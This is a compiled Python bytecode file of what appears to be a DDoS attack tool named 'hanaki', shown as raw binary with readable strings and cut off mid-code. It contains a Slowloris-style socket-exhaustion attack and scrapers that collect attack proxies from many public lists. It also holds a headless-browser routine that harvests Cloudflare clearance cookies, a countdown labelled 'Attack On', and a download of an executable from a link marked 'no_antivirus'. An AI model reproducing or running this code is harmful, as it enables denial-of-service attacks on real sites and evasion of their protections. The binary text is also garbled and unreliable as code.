o
    A�1c�M �                   @   s6
  d d� Z ddlmZmZmZ ddlmZmZmZm	Z	 ddl
mZ ddlmZ ddlmZmZ ddlZdd	lmZ ddlZddlZddlZddlZddlZddlZe��  ddlZe�d
� e�d
� e e_ ddlmZ ddl Z ddl!m"Z"m#Z#m$Z$ ddl%Z%ddlZddlZddl&Z&ddl'Z'ddl(Z(ddl)Z)ddlZddl*Z+ddl,Z,ddlm-Z-m.Z.m/Z/m0Z0 ddl1Z1ddl2Z3ddl1m4Z4m5Z5 ddlZddlZddlZddl6Z6ddl7Z7ddl)Z)ddl8Z8ddl9Z9ddl:Z:ddlZddl8Z8ddl'Z'e�;� � ejd
e<d� ddl8Z8W d  � n	1 �sw   Y  ddl=m>Z> ddl?m@Z@ ddl2Z3ddl'mAZA ddl%mBZBmCZCmDZDmEZE ddlFmGZG ddlFmHZH dd� ZIdd� ZJg d�ZKg d�ZLdaMdd� ZNg d�ZOd d!� ZPd"d#� ZQd$d%� ZRe�Sd&�jTaUd'd(� ZVd)d*gZWd+d,� ZXd-d.� ZYg d/�ZZd0d1� Z[d2d3� Z\d4d5� Z]d6d7� Z^d8d9� Z_d:d;� Z`d<d=� Zad>d?� Zbd@dA� ZcdBdC� ZddDdE� ZedFdG� ZfdHdI� ZgdJdK� ZhdLdM� ZidNdO� ZjdPdQ� ZkdRdS� ZldTdU� ZmdVdW� ZndXdY� ZodZd[� Zpd\d]� Zqd^d_� Zrd`da� Zsdbdc� Ztddde� Zudfdg� Zvdhdi� Zwdjdk� Zxdldm� Zydndo� Zzdpdq� Z{drds� Z|dtdu� Z}dvdw� Z~dxdy� Zdzd{� Z�d|d}� Z�d~d� Z�d�d�� Z�d�d� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�dw� Z~d�dy� Zd�d�� Z�d�d{� Z�d�d� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�gZ�d�d�d��Z�d�d�� Z�d�d�� Z�d�d�� Z�e�d�k�reCd�d�� e�e'j��d�k �r�e��  e��  ne�e'j��d�k�r�neA��d�� eA��d�e'j�d � d��� e'���  e�d�d����� ��d��Z�e'j�d� ��� ZKe'j�d� ��� Z�e'j�d� ��� Z�e'j�d� ��� Z�eKd�k�rejeJe�fdōZ�e����  e�e�e�e�� e����  dS eKd�k�r8eR� �r6ejeJe�fdōZ�e����  e�e�e�e�� e����  dS dS eKd�k�rUejeJe�fdōZ�e����  ene�e�e�� e����  dS eKd�k�rrejeJe�fdōZ�e����  ele�e�e�� e����  dS eKd�k�r�ejeJe�fdōZ�e����  eje�e�e�� e����  dS eKd�k�r�eR� �r�ejeJe�fdōZ�e����  epe�e�e�� e����  dS dS eKd�k�r�ejeJe�fdōZ�e����  ete�e�e�� e����  dS eKd�k�r�eR� �r�ejeJe�fdōZ�e����  ere�e�e�� e����  dS dS eKd�k�r0eA��eBj�d� eBj� d� � eVe���r!ejeJe�fdōZ�e����  e�e�e�e�� e����  dS eA��eBj�d� eBj� d� � dS eKd�k�rneA��eBj�d� eBj� d� � eVe���r_ejeJe�fdōZ�e����  e�e�e�e�� e����  dS eA��eBj�d� eBj� d� � dS eKd�k�r�e^� \Z�Z�Z�ejeJe�fdōZ�e����  e�e�e�e�� e����  dS eKd�k�r�eR� �r�e^� \Z�Z�Z�ejeJe�fdōZ�e����  e�e�e�e�� e����  dS dS eKd�k�r�eR� �r�e^� \Z�Z�Z�eje�e�e�e�fdō���  ejeJe�fdōZ�e����  e����  dS dS eKd�k�re^� \Z�Z�Z�eje�e�e�e�fdō���  ejeJe�fdōZ�e����  e����  dS eA��dס dS dS )�c                  O   s   d S )N� )�args�kwargsr   r   �(C:\Users\NEC\Desktop\HANAKI PC\hanaki.py�warn   s   r   �    )�
BannerText�Print�Scroll)�ColourImageFile�
FigletText�	ImageFile�StaticRenderer)�Scene)�Screen)�ResizeScreenError�StopApplicationN)�count�ignore)�Thread)�Colors�Colorate�Center)�system�name�mkdir�rmdir)�AsyncClient�Headers)�category)�urlparse)�RequestsCookieJar)�stdout)�Fore�init�Style�Back)�request)�jsonifyc                  C   sB   zt d�} W d S    ttjd � t�d� ttjd � Y d S )Nztc.exeu&   Đang tải dữ liệu mở rộng...zehttps://drive.google.com/uc?export=download&confirm=no_antivirus&id=1NLUkyA5M-rKQnm6rBQrnwbZreonzFf8DzDownloaded!)�open�printr"   �MAGENTA�wgetZdownload)Zctcpr   r   r   �checkExtraMethod-   s   
r,   c                 C   sr   t j �� t jt| �d� }	 |t j ��  �� dkr(t��  t�dtj	 d � nt��  t�dtj
 d � d S q)N�ZsecondsTr   z  z0 Attack On !                                   
z z2 Attack Done !                                   
)�datetime�now�	timedelta�int�total_secondsr!   �flush�writer"   ZBLACK�RED)�t�untilr   r   r   �	countdown5   s   ��r8   )�GET�POST�HEAD)�^https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all�-https://www.proxyscan.io/download?type=socks5�Hhttps://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txtz
socks5.txtc                  C   s@   t td�} tD ]}z| �t�|�j� W q   Y q| ��  d S )N�wb)r(   �	socksFile�proxyResourcesr4   �requests�getZcontent�close)�f�urlr   r   r   �socksCrawlerO   s   
rG   )�zZMozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1zWMozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zBMozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z?Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0zUMozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zcMozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2z�Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0zGMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0zCMozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zOMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zjMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7ziMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6zLMozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1zRMozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4prezJMozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2zJMozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1zbMozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3z`Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0zFMozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)zPMozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016zwMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10zsMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18z\Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10zuMozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)zsMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9zvMozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8zqMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)zwMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )zrMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1zuMozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14z]Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5zbMozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2prezoMozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12zsMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14zvMozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20z>Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0azMMozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2zCMozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0zaMozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1z�Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2zNMozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1z[Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1zVMozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1zCMozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 zDMozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zJMozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6prez@Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0zTMozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2z@Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0z@Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1zeMozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5zUMozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2prezHMozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1zYMozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2zFMozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1zLMozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1prezPMozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0zFMozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1zoMozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zRMozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8zmMozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0zNMozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15z8Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) GeckoztMozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16zMMozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025zTMozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1zMMozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020zbMozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1zXMozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)zlMozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncherzrMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 DebianzkMozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8z�Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15zJMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8zCMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7zEMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5zDMozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)zYMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)ziMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11zWMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)zVMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0zgMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2zCMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330zXMozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)zcMozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8znMozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0z`Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9�pMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15�mMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7�xMozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0zWMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8zVMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12zhMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5zYMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9zjMozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12zbMozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0zUMozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15zmMozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0zmMozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3zNMozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5zTMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8zQMozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3zUMozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6rH   rI   rJ   rK   z�Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNz�Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNa   Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CNz�Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CNz�Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CNc                 C   s�   | � � } i }t| �j|d< |d dkrd|d< t| �j|d< t| �j|d< dt| �jv r:t| �j�d�d |d< |S t| �jd	krCd
nd|d< 	 |S )N�uri� �/�host�scheme�:�   �port�httpsZ443Z80)�rstripr   �path�netlocrP   �split)rF   �targetr   r   r   �
get_target�   s   �rZ   c                 C   s�   | dkr#t �d�j}|t �d�j7 }tdd��|� |�� �d�}|S | dkrFt �d�j}|t �d	�j7 }tdd��|� |�� �d�}|S d S )
N�SOCKS5r<   z6https://www.proxy-list.download/api/v1/get?type=socks5�	proxy.txt�w�
�HTTPz\https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=allz4https://www.proxy-list.download/api/v1/get?type=http)rB   rC   �textr(   r4   rU   rX   )�type�rr   r   r   �get_proxylist�   s*   �����rc   c                   C   sH   t j�d�st�tjd tj d � dS tddddd��	� �
d	�ad
S )N�./proxy.txtz [*]z% You Need Proxy File ( ./proxy.txt )
Frb   �utf8r   ��encoding�errors�
T)�osrV   �existsr!   r4   r"   r*   �WHITEr(   �readrX   �proxiesr   r   r   r   �get_proxies�   s
   ro   �http://fsystem88.ru/ipc           	      C   s�   t �� }g d�}|D ]}|�|� q
t j|d�}|�d� |�| � td�D ];}|�� }d}|D ]+}|d dkrV|�� | a|�	d�a
td � d	td
 � �a|��    dS |d7 }	 q0t�d� q&|��  dS )N)z--no-sandboxz--disable-setuid-sandboxz--disable-infobarsz--disable-loggingz--disable-login-animationsz--disable-notificationsz--disable-gpuz
--headlessz--lang=ko_KRz--start-maxmizedz�--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en)�options�   �<   r   r   Zcf_clearancezreturn navigator.userAgent�=�valueTrR   F)�	webdriverZChromeOptionsZadd_argumentZChromeZimplicitly_waitrC   �rangeZget_cookies�	cookieJARZexecute_script�	useragent�cookie�quit�time�sleep)	rY   rq   Z	argumentsZargumentZdriver�_�cookiesZtryy�ir   r   r   �
get_cookie  s,   


r�   zMUser-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0�Accept-language: en-US,en,q=0.5c                 C   sx   t � t jt j�}|�d� |�tt| �j�td�f� |�	d�
t�dd���d�� tD ]}|�	d�
|��d�� q,|S )N�   �  �GET /?{} HTTP/1.1
r   ��  �UTF-8�{}
)�socket�AF_INET�SOCK_STREAMZ
settimeout�connect�strr   rW   r1   �send�format�random�randint�encode�regular_headers)rY   �s�headerr   r   r   �init_socket+  s   
r�   c               	   C   s  t d�} g }tt | ��D ]}zttd�}W n tjy    Y  nw |�|� qtd� 	 td�t	|��� |D ]"}z|�
d�t�dd���d	�� W q7 tjyY   |�|� Y q7w t| t	|� �D ]"}td
�d�� zttt�}|rx|�|� W qb tjy�   Y  nw t�t� q,)N�   r�   zSockets initedTz+[0;37;40m Sending Keep-Alive Headers to {}zX-a {}
rR   �  r�   z"[1;34;40m {}Re-creating Socket...ri   )r1   rw   r�   rY   r�   �error�appendr)   r�   �lenr�   r�   r�   r�   �remove�iprS   r|   r}   �timer)Zsocket_countZsocket_listr~   r�   r   r   r   �pyloris4  s<   �"�

��
�r�   )%z-https://www.proxyscan.io/download?type=socks4zHhttps://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txtz^https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txtz(https://api.openproxylist.xyz/socks4.txtzGhttps://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txtzNhttps://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txtzlhttps://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=truer=   r>   zFhttps://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txtzGhttps://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txtz^https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txtz(https://api.openproxylist.xyz/socks5.txt�Bhttps://api.proxyscrape.com/?request=displayproxies&proxytype=httpz+https://www.proxyscan.io/download?type=httpzFhttps://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txtz&https://api.openproxylist.xyz/http.txtzFhttps://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txtz#http://alexa.lr2b.com/proxylist.txtz'http://rootjazz.com/proxies/proxies.txtz?http://proxysearcher.sourceforge.net/Proxy%20List.php?type=httpz\https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt�Ohttps://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txtzLhttps://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txtzChttps://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txtz0https://proxy-spider.com/api/proxies.example.txtz(https://multiproxy.org/txt_all/proxy.txtzMhttps://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txtzIhttps://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txtzJhttps://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txtzPhttps://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=allz_https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=descr�   zahttps://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txtzbhttps://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txtzbhttps://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txtzbhttps://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txtc              
   C   s�   z1t �| �}|j}|�� }tddddd��}|�d�|�� W d   � W dS 1 s*w   Y  W dS  tyE } z|W  Y d }~S d }~ww )Nr\   �are   r   rf   ri   T)rB   rC   r`   rX   r(   �
writelines�join�	Exception)�site�dataZtext_for_parse�resZ
proxy_file�Errorr   r   r   �steal_proxiesx  s   

����r�   c               
   C   sH   zt dd� tdd�D ��} | W S  ty# } z|W  Y d }~S d }~ww )Nc                 s   s   � | ]}d V  qdS )rR   Nr   )�.0�liner   r   r   �	<genexpr>�  s   � z count_proxies.<locals>.<genexpr>r\   rb   )�sumr(   r�   )rn   r�   r   r   r   �count_proxies�  s   ��r�   c                 C   s�   g d�}d}t t�dd��|d< t t�dd��|d< t t�dd��|d< t t�dd	��|d
< |d | |d  | |d  | |d
